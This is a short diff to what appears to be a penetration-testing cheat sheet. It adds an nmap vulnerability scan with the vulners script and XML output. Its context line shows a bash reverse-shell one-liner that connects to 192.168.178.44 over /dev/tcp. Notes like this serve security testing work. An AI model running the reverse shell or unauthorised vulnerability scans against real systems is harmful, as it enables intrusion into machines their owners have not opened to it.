@@ -14,6 +14,8 @@ bash -i >& /dev/tcp/192.168.178.44/87 0>&1
 ```
 ## nmap
 ```
+nmap --script vulners -oX file.xml <target>
+
 nmap -p 80 --script vulners <target>
 
 nmap -sV --script vulners <target>
